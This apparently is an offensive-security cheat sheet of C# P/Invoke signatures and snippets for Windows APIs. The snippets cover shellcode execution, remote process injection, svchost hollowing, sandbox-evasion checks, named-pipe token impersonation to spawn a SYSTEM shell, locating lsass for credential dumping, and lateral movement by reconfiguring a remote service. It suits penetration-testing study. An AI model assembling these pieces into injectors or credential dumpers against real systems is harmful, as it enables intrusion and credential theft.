## [VirtualAlloc](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc):

```
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
```

```
IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
```

## [CreateThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread):

```
[DllImport("kernel32.dll")]
static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
```

```
IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
```

## [WaitForSingleObject](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject):

```
[DllImport("kernel32.dll")]
static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
```

```
WaitForSingleObject(hThread, 0xFFFFFFFF);
```

## [OpenProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess):

```
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
```

```
IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4804);
```

## [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex):

```
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
```

```
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
```

## [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory):

```
[DllImport("kernel32.dll")]
static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
```

```
IntPtr outSize;
WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
```

## [CreateRemoteThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread):

```
[DllImport("kernel32.dll")]
static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
```

```
IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
```

## [GetProcAddress](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress):

```
[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
```

```
IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
```

## [GetModuleHandle](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea):

```
[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
public static extern IntPtr GetModuleHandle(string lpModuleName);
```

```
IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
```

## [CreateProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw):

```
[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
struct STARTUPINFO
{
 public Int32 cb;
 public IntPtr lpReserved;
 public IntPtr lpDesktop;
 public IntPtr lpTitle;
 public Int32 dwX;
 public Int32 dwY;
 public Int32 dwXSize;
 public Int32 dwYSize;
 public Int32 dwXCountChars;
 public Int32 dwYCountChars;
 public Int32 dwFillAttribute;
 public Int32 dwFlags;
 public Int16 wShowWindow;
 public Int16 cbReserved2;
 public IntPtr lpReserved2;
 public IntPtr hStdInput;
 public IntPtr hStdOutput;
 public IntPtr hStdError;
}

internal struct PROCESS_INFORMATION
{
 public IntPtr hProcess;
 public IntPtr hThread;
 public int dwProcessId;
 public int dwThreadId;
}

internal struct PROCESS_BASIC_INFORMATION
{
 public IntPtr Reserved1;
 public IntPtr PebAddress;
 public IntPtr Reserved2;
 public IntPtr Reserved3;
 public IntPtr UniquePid;
 public IntPtr MoreReserved;
}

[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
```

```
STARTUPINFO si = new STARTUPINFO();
PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
```

## [ZwQueryInformationProcess](https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess):

```
[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
```

```
PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
uint tmp = 0;
IntPtr hProcess = pi.hProcess;
ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
```

## [ReadProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory):

```
[DllImport("kernel32.dll", SetLastError = true)]
static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
```

```
byte[] addrBuf = new byte[IntPtr.Size];
IntPtr nRead = IntPtr.Zero;
ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
byte[] data = new byte[0x200];
ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
```

## [ResumeThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread):

```
[DllImport("kernel32.dll", SetLastError = true)]
private static extern uint ResumeThread(IntPtr hThread);
```

```
ResumeThread(pi.hThread);
```

## [Sleep](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleep):

```
[DllImport("kernel32.dll")]
static extern void Sleep(uint dwMilliseconds);
```

```
Sleep(2000);
```

## [VirtualAllocExNuma](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocexnuma):

```
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
```

```
IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
if(mem == null)
{
 return;
}
```

## [FlsAlloc](https://docs.microsoft.com/en-us/windows/win32/api/fibersapi/nf-fibersapi-flsalloc):

```
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr FlsAlloc(IntPtr callback);
```

```
IntPtr index = FlsAlloc(IntPtr.Zero)
if(index.ToInt32() < 0)
{
 return;
}
```

## [InternetOpen](https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena):

```
[DllImport("wininet.dll", SetLastError = true, Charset = CharSet.Auto)]
static extern IntPtr InternetOpen(string lpszAgent, int dwAccessType, string lpszProxyName, string lpszProxyBypass, int dwFlags);
```

```
IntPtr hand = InternetOpen("appname", 0, null, null, 0);
```

## [InternetOpenUrl](https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurla):

```
[DllImport("wininet.dll", SetLastError = true, Charset = CharSet.Auto)]
static extern IntPtr InternetOpenUrl(IntPtr iHandle, string lpszUrl, string lpszHeaders, int headerLen, int dwFlags, IntPtr dwContext);
```

```
IntPtr hand = InternetOpen("appname", 0, null, null, 0);
IntPtr site = InternetOpenUrl(hand, "www.thishastobeafakewebsiteorthetestwontworkandyoulllooklikeadummysojustusethis13377331hacktheplanet.com", null, 0, 0, IntPtr.Zero);
if(site == null)
{
 return;
}
```

## [GetCurrentProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess):

```
[DllImport("kernel32.dll")]
static extern IntPtr GetCurrentProcess();
```

```
IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
```

## [CreateNamedPipe](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea):

```
[DllImport("kernel32.dll", SetLastError = true)]
static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);
```

```
string pipeName = args[0];
IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
```

## [ConnectNamedPipe](https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe):

```
[DllImport("kernel32.dll")]
static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);
```

```
ConnectNamedPipe(hPipe, IntPtr.Zero);
```

## [ImpersonateNamedPipeClient](https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient):

```
[DllImport("Advapi32.dll")]
static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
```

```
ImpersonateNamedPipeClient(hPipe);
```

## [GetCurrentThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentthread):

```
[DllImport("kernel32.dll")]
private static extern IntPtr GetCurrentThread();
```

```
OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);
```

## [GetCurrentThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthreadtoken):

```
[DllImport("advapi32.dll", SetLastError = true)]
static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);
```

```
OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);
```

## [GetTokenInformation](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation):

```
[DllImport("advapi32.dll", SetLastError = true)]
static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);
```

```
int TokenInfLength = 0;
GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);
```

## [ConvertSidToStringSid](https://docs.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertsidtostringsida):

```
[StructLayout(LayoutKind.Sequential)]
public struct SID_AND_ATTRIBUTES
{
 public IntPtr Sid;
 public int Attributes;
}

public struct TOKEN_USER
{
 public SID_AND_ATTRIBUTES User;
}

[DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);
```

```
TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, 
typeof(TOKEN_USER));
IntPtr pstr = IntPtr.Zero;
Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
string sidstr = Marshal.PtrToStringAuto(pstr);
```

## [DuplicateTokenEx](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex):

```
[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);
```

```
IntPtr hSystemToken = IntPtr.Zero;
DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);
```

## [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw):

```
[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION
{
 public IntPtr hProcess;
 public IntPtr hThread;
 public int dwProcessId;
 public int dwThreadId;
}
[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
public struct STARTUPINFO
{
 public Int32 cb;
 public string lpReserved;
 public string lpDesktop;
 public string lpTitle;
 public Int32 dwX;
 public Int32 dwY;
 public Int32 dwXSize;
 public Int32 dwYSize;
 public Int32 dwXCountChars;
 public Int32 dwYCountChars;
 public Int32 dwFillAttribute;
 public Int32 dwFlags;
 public Int16 wShowWindow;
 public Int16 cbReserved2;
 public IntPtr lpReserved2;
 public IntPtr hStdInput;
 public IntPtr hStdOutput;
 public IntPtr hStdError;
}

[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
```

```
PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
STARTUPINFO si = new STARTUPINFO();
si.cb = Marshal.SizeOf(si);
CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\System32\\cmd.exe", 0, 
IntPtr.Zero, null, ref si, out pi);
```

## [MiniDumpWriteDump](https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump):

```
[DllImport("Dbghelp.dll")]
static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
```

```
Process[] lsass = Process.GetProcessesByName("lsass");
int lsass_pid = lsass[0].Id;
```

## [OpenSCManager](https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagera):

```
[DllImport("advapi32.dll", EntryPoint="OpenSCManagerW", ExactSpelling=true, CharSet=CharSet.Unicode, SetLastError=true)]
public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);
```

```
String target = "appsrv01";
IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);
```

## [OpenService](https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openservicea):

```
[DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)]
static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);
```

```
string ServiceName = "SensorService";
IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);
```

## [ChangeServiceConfigA](https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-changeserviceconfiga):

```
[DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);
```

```
string payload = "notepad.exe";
bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, null, null, null, null);
```

## [StartService](https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicea):

```
[DllImport("advapi32", SetLastError=true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);
```

```
bResult = StartService(schService, 0, null);
```

## [RevertToSelf](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-reverttoself):

```
[DllImport("advapi32.dll", SetLastError = true)]
static extern bool RevertToSelf();
```

```
RevertToSelf();
```

## [GetSystemDirectory](https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya):

```
[DllImport("kernel32.dll")]
static extern uint GetSystemDirectory([Out] StringBuilder lpBuffer, uint uSize);
```

```
StringBuilder sbSystemDir = new StringBuilder(256);
uint res1 = GetSystemDirectory(sbSystemDir, 256);
```

## [CreateEnvironmentBlock](https://docs.microsoft.com/en-us/windows/win32/api/userenv/nf-userenv-createenvironmentblock):

```
[DllImport("userenv.dll", SetLastError = true)]
static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);
```

```
IntPtr env = IntPtr.Zero;
bool res = CreateEnvironmentBlock(out env, hSystemToken, false);
```
